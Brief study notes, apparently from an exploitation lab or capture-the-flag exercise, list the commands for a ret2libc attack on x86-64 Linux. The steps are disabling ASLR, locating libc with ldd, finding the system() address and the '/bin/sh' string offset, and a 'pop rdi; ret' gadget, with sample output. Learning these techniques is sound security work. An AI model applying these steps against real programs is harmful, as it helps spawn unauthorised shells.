echo 0 | sudo tee /proc/sys/kernel/randomize_va_space


ldd to get program libc location

ldd program
 linux-vdso.so.1 (0x00007ffc917b1000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2fb79df000)
 /lib64/ld-linux-x86-64.so.2 (0x00007f2fb7bc1000)



readelf to get system function address

readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep system
  1467: 0000000000049850    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5

/bin/sh string location

strings -a -t x /usr/lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
 188962 /bin/sh

find pop rdi ret

0x00000000004007c3: pop rdi; ret;
  
  